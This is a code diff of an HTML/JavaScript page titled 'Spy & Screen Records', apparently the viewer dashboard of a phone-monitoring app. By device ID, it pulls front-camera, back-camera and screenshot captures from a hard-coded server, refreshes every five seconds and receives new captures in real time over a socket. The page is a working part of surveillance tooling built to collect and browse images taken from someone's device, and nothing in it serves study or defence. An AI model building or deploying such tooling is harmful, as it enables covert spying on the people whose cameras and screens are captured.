@@ -3,65 +3,136 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Spy Gallery (Cloudinary Mode)</title>
+    <title>Spy & Screen Records</title>
     
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
 
     <style>
-        /* --- DARK THEME STYLES --- */
+        /* --- RESET & BASICS --- */
         * { box-sizing: border-box; }
+        
         body {
             background-color: #0f0f0f;
             background-image: linear-gradient(45deg, #000000, #1a1a1a);
             color: #ffffff;
             font-family: 'Segoe UI', sans-serif;
-            margin: 0; padding: 20px;
+            margin: 0; 
+            padding: 20px;
             min-height: 100vh;
         }
 
-        /* HEADER */
-        .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; }
+        /* --- HEADER --- */
+        .header { 
+            display: flex; 
+            align-items: center; 
+            justify-content: space-between; 
+            margin-bottom: 20px; 
+        }
         .back-btn {
             background: rgba(255, 255, 255, 0.05); 
             border: 1px solid rgba(255, 255, 255, 0.15);
-            color: #fff; padding: 10px 15px; 
-            border-radius: 12px; cursor: pointer; text-decoration: none; 
+            color: #fff; 
+            padding: 10px 15px; 
+            border-radius: 12px;
+            cursor: pointer; 
+            text-decoration: none; 
+            font-size: 1rem;
         }
-        .page-title { font-weight: bold; text-transform: uppercase; letter-spacing: 1px; }
+        .page-title { 
+            font-size: 1.1rem; 
+            font-weight: bold; 
+            color: #fff; 
+            text-transform: uppercase; 
+            letter-spacing: 1px; 
+        }
 
-        /* TABS */
+        /* --- TABS --- */
         .tabs-container {
-            display: flex; gap: 15px; margin-bottom: 25px;
-            background: rgba(255,255,255,0.03); padding: 8px; border-radius: 15px;
+            display: flex; 
+            gap: 15px; 
+            margin-bottom: 25px;
+            background: rgba(255,255,255,0.03); 
+            padding: 8px; 
+            border-radius: 15px;
         }
         .tab-btn {
-            flex: 1; padding: 12px; border: none; background: transparent; 
-            color: #666; font-weight: 600; cursor: pointer; transition: 0.3s;
-            border-bottom: 2px solid transparent; display: flex; align-items: center; justify-content: center; gap: 8px;
+            flex: 1; 
+            padding: 12px; 
+            border: none; 
+            outline: none;
+            background: transparent; 
+            color: #666;
+            font-size: 0.95rem; 
+            font-weight: 600;
+            border-bottom: 2px solid transparent;
+            cursor: pointer; 
+            transition: 0.3s;
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            gap: 8px;
         }
-        .tab-btn.active { color: #fff; background: rgba(255,255,255,0.05); border-radius: 10px; }
-        .tab-btn[data-target="camera"].active { border-bottom-color: #ff4444; color: #ff4444; }
-        .tab-btn[data-target="screen"].active { border-bottom-color: #00f3ff; color: #00f3ff; }
+        .tab-btn.active { 
+            color: #fff; 
+            background: rgba(255,255,255,0.05); 
+            border-radius: 10px; 
+        }
+        /* Active Colors */
+        .tab-btn[data-target="camera"].active { 
+            border-bottom-color: #ff4444; 
+            color: #ff4444; 
+        }
+        .tab-btn[data-target="screen"].active { 
+            border-bottom-color: #00f3ff; 
+            color: #00f3ff; 
+        }
 
-        /* GALLERY GRID */
+        /* --- GALLERY GRID --- */
         .gallery-container {
-            display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; padding-bottom: 20px;
-        }
-        .img-card {
-            background: #000; border-radius: 12px; overflow: hidden; position: relative;
-            border: 1px solid rgba(255, 255, 255, 0.15); cursor: pointer; height: 250px; 
-            display: flex; align-items: center; justify-content: center;
-        }
-        .img-card img { 
-            width: 100%; height: 100%; object-fit: contain; background-color: #000; 
-        }
-        .source-badge {
-            position: absolute; bottom: 0; left: 0; right: 0;
-            background: rgba(0,0,0,0.8); color: #fff; font-size: 0.7rem; padding: 6px; text-align: center;
+            display: grid;
+            grid-template-columns: repeat(2, 1fr); /* 2 images per row */
+            gap: 15px;
+            padding-bottom: 20px;
         }
 
-        /* LOAD MORE */
+        .img-card {
+            background: #000;
+            border-radius: 12px;
+            overflow: hidden;
+            position: relative;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.5);
+            height: 250px; 
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        /* 🔥 CHANGE HERE: 'contain' dikhayega puri photo */
+        .img-card img { 
+            width: 100%; 
+            height: 100%; 
+            object-fit: contain; /* ✅ AB PURI PHOTO DIKHEGI */
+            background-color: #000;
+            transition: transform 0.3s;
+        }
+        .img-card:hover img { transform: scale(1.02); }
+
+        .source-badge {
+            position: absolute; 
+            bottom: 0; left: 0; right: 0;
+            background: rgba(0,0,0,0.8); 
+            color: #fff;
+            font-size: 0.7rem; 
+            padding: 6px; 
+            text-align: center;
+            text-transform: uppercase; 
+            letter-spacing: 0.5px;
+        }
+
+        /* --- EXTRAS --- */
         .load-more-container { text-align: center; margin-bottom: 50px; margin-top: 20px; }
         .btn-load-more {
             background: #333; color: #fff; border: 1px solid #555;
@@ -70,24 +141,37 @@
         }
 
         .loader {
-            border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #00f3ff;
+            border: 3px solid rgba(255,255,255,0.1); 
+            border-top: 3px solid #00f3ff;
             border-radius: 50%; width: 30px; height: 30px;
-            animation: spin 1s linear infinite; margin: 20px auto; display: none;
+            animation: spin 1s linear infinite; margin: 20px auto;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         
-        .status-msg { text-align: center; color: #888; margin-top: 50px; display: none; }
+        .status-msg { text-align: center; color: #888; margin-top: 50px; }
 
-        /* MODAL */
+        /* --- MODAL --- */
         .modal {
-            display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%;
-            background-color: rgba(0,0,0,0.95); align-items: center; justify-content: center; flex-direction: column;
+            display: none; position: fixed; z-index: 1000;
+            left: 0; top: 0; width: 100%; height: 100%;
+            background-color: rgba(0,0,0,0.95);
+            align-items: center; justify-content: center; flex-direction: column;
+            padding: 10px;
         }
-        .modal img { max-width: 100%; max-height: 80vh; object-fit: contain; box-shadow: 0 0 20px #000; }
+        .modal img { 
+            max-width: 100%; max-height: 80vh; 
+            border-radius: 5px; box-shadow: 0 0 20px #000; 
+            object-fit: contain; 
+        }
+        .modal-close { 
+            position: absolute; top: 15px; right: 20px; 
+            color: #fff; font-size: 2.5rem; cursor: pointer; 
+        }
         .modal-actions { margin-top: 20px; display: flex; gap: 20px; }
         .action-btn {
-            background: #333; color: #fff; padding: 10px 25px; border-radius: 30px; 
-            text-decoration: none; border: 1px solid #555; cursor: pointer;
+            background: #333; color: #fff; padding: 10px 25px;
+            border-radius: 30px; text-decoration: none; 
+            font-size: 0.9rem; border: 1px solid #555;
         }
     </style>
 </head>
@@ -108,11 +192,11 @@
         </button>
     </div>
 
-    <div id="loading" class="loader"></div>
+    <div id="loading" class="loader" style="display: none;"></div>
     
-    <div id="emptyState" class="status-msg">
+    <div id="emptyState" class="status-msg" style="display: none;">
         <i class="fa-regular fa-folder-open" style="font-size: 2rem; margin-bottom: 10px;"></i><br>
-        No captures found.
+        No captures found here.
     </div>
 
     <div class="gallery-container" id="galleryGrid"></div>
@@ -124,25 +208,27 @@
     </div>
 
     <div id="imageModal" class="modal">
+        <span class="modal-close" onclick="closeModal()">&times;</span>
         <img id="fullImage" src="">
         <div class="modal-actions">
             <a id="downloadLink" href="#" target="_blank" class="action-btn">
-                <i class="fa-solid fa-download"></i> Open Original
+                <i class="fa-solid fa-download"></i> Open
             </a>
             <button onclick="closeModal()" class="action-btn">Close</button>
         </div>
     </div>
 
     <script>
-        // 🔥 AUTO-DETECT SERVER URL
-        const API_BASE = window.location.origin; 
+        // 🔥 SERVER URL
+        const API_BASE = 'https://child-v9no.onrender.com'; 
         
         const urlParams = new URLSearchParams(window.location.search);
         const DEVICE_ID = urlParams.get('id') || localStorage.getItem('monitoring_id');
 
         let allFilesData = []; 
         let currentFilter = 'camera'; 
-        let nextCursor = null; // Cloudinary Pagination Cursor
+        let nextCursor = null; 
+        let isLoading = false;
 
         // UI Elements
         const galleryGrid = document.getElementById('galleryGrid');
@@ -154,7 +240,7 @@
         const downloadLink = document.getElementById('downloadLink');
         const tabs = document.querySelectorAll('.tab-btn');
 
-        // Socket Connection
+        // 🔥 1. SOCKET CONNECTION
         const socket = io(API_BASE, { transports: ['websocket', 'polling'] });
 
         window.onload = function() {
@@ -162,83 +248,106 @@
                 alert("Device ID Missing!");
                 return;
             }
-            fetchFiles(); // Initial Load
-            setupSocket();
+            fetchFiles(true, false); 
+            setupSocket();            
+
+            setInterval(() => {
+                fetchFiles(true, true);
+            }, 5000); 
         };
 
         // ==========================================
-        //  1. FETCH DATA (Cloudinary Logic)
+        //  2. FETCH DATA FROM SERVER
         // ==========================================
-        function fetchFiles() {
-            loadingSpinner.style.display = 'block';
-            loadMoreArea.style.display = 'none';
+        function fetchFiles(isReset = false, isBackground = false) {
+            if (isLoading && !isBackground) return; 
+            
+            isLoading = true;
+            if (!isBackground) loadingSpinner.style.display = 'block';
 
-            let url = `${API_BASE}/api/gallery-list/${DEVICE_ID}`;
-            if (nextCursor) url += `?next_cursor=${nextCursor}`;
+            let url = `${API_BASE}/api/gallery-list/${DEVICE_ID}?limit=20`;
+            if (nextCursor && !isReset) url += `&next_cursor=${nextCursor}`;
 
             fetch(url)
                 .then(response => response.json())
                 .then(data => {
-                    loadingSpinner.style.display = 'none';
-                    
-                    // Cloudinary response structure handle karo
-                    const newPhotos = data.photos || [];
-                    nextCursor = data.next_cursor || null;
+                    if (!isBackground) loadingSpinner.style.display = 'none';
+                    isLoading = false;
 
-                    // Data merge logic
-                    newPhotos.forEach(photoUrl => {
-                        if (!allFilesData.includes(photoUrl)) {
-                            allFilesData.push(photoUrl);
+                    let newFiles = data.photos || [];
+                    
+                    if (data.next_cursor) {
+                        nextCursor = data.next_cursor;
+                        if (!isBackground || loadMoreArea.style.display !== 'block') {
+                             loadMoreArea.style.display = 'block';
                         }
-                    });
+                    } else {
+                        nextCursor = null;
+                        loadMoreArea.style.display = 'none';
+                    }
+
+                    const isDataDifferent = JSON.stringify(newFiles) !== JSON.stringify(allFilesData.slice(0, newFiles.length));
+
+                    if (isReset) {
+                        if (isBackground && !isDataDifferent) return; 
+                        allFilesData = newFiles; 
+                    } else {
+                        allFilesData = [...allFilesData, ...newFiles]; 
+                    }
 
                     renderGallery();
-
-                    // Show Load More if cursor exists
-                    if (nextCursor) {
-                        loadMoreArea.style.display = 'block';
-                    }
                 })
                 .catch(err => {
                     console.error("Fetch Error:", err);
-                    loadingSpinner.style.display = 'none';
+                    if (!isBackground) loadingSpinner.style.display = 'none';
+                    isLoading = false;
                 });
         }
 
         function fetchNextPage() {
-            if (nextCursor) fetchFiles();
+            if (nextCursor) fetchFiles(false, false);
         }
 
         // ==========================================
-        //  2. FILTER & RENDER
+        //  3. FILTER & RENDER (UPDATED: NO GALLERY)
         // ==========================================
         function switchTab(category) {
             currentFilter = category;
+            
             tabs.forEach(btn => {
                 btn.classList.remove('active');
                 if(btn.dataset.target === category) btn.classList.add('active');
             });
+
             renderGallery();
         }
 
         function renderGallery() {
-            galleryGrid.innerHTML = '';
-
             const filtered = allFilesData.filter(url => {
                 const lowerUrl = url.toLowerCase();
-                
-                // Hide Gallery previews (icon)
-                if (lowerUrl.includes('gallery')) return false;
 
-                // Check type based on Cloudinary Folder/Name
-                const isCam = lowerUrl.includes('cam') || lowerUrl.includes('front') || lowerUrl.includes('back');
-                
-                if (currentFilter === 'camera') return isCam;
-                else return !isCam; // Everything else (Screen)
+                // 🛑 BLOCK GALLERY FOLDER
+                if (lowerUrl.includes('gallery')) {
+                    return false;
+                }
+
+                // 🔍 IDENTIFY CAMERA
+                const isCamera = lowerUrl.includes('front') || 
+                                 lowerUrl.includes('back') || 
+                                 lowerUrl.includes('cam');
+
+                if (currentFilter === 'camera') {
+                    return isCamera; // Only Camera
+                } else {
+                    return !isCamera; // Only Screen (Everything else)
+                }
             });
+
+            galleryGrid.innerHTML = '';
 
             if (filtered.length === 0) {
                 emptyState.style.display = 'block';
+                return;
             } else {
                 emptyState.style.display = 'none';
             }
@@ -251,9 +360,10 @@
                 let badgeText = "Screen Capture"; 
                 if(url.includes('front')) badgeText = "Front Cam";
                 else if(url.includes('back')) badgeText = "Back Cam";
-                
+                else if(url.includes('screen') || url.includes('shot')) badgeText = "Screen Shot";
+
                 div.innerHTML = `
-                    <img src="${url}" loading="lazy">
+                    <img src="${url}" loading="lazy" onerror="this.style.display='none'">
                     <div class="source-badge">${badgeText}</div>
                 `;
                 galleryGrid.appendChild(div);
@@ -261,22 +371,35 @@
         }
 
         // ==========================================
-        //  3. SOCKET (Real-time Cloudinary Updates)
+        //  4. REAL-TIME SOCKET
         // ==========================================
         function setupSocket() {
             socket.on('new-file', (data) => {
+                console.log("New file via Socket:", data);
                 if (data.device_id === DEVICE_ID) {
-                    // Add new image to top
+                    
                     if (!allFilesData.includes(data.url)) {
                         allFilesData.unshift(data.url);
-                        renderGallery(); 
+                    }
+                    
+                    let urlLower = data.url.toLowerCase();
+                    
+                    // 🛑 SOCKET SE BHI GALLERY KO ROK DO
+                    if (urlLower.includes('gallery')) return;
+
+                    let isCam = urlLower.includes('cam') || urlLower.includes('front') || urlLower.includes('back');
+                    
+                    if (currentFilter === 'camera' && isCam) {
+                        renderGallery();
+                    } else if (currentFilter === 'screen' && !isCam) {
+                        renderGallery();
                     }
                 }
             });
         }
 
         // ==========================================
-        //  4. MODAL
+        //  MODAL LOGIC
         // ==========================================
         function openModal(url) {
             fullImage.src = url;
@@ -289,9 +412,8 @@
             fullImage.src = '';
         }
 
-        // Close on click outside
-        modal.addEventListener('click', (e) => {
-            if(e.target === modal) closeModal();
+        modal.addEventListener('click', function(e) {
+            if (e.target === modal) closeModal();
         });
 
     </script>
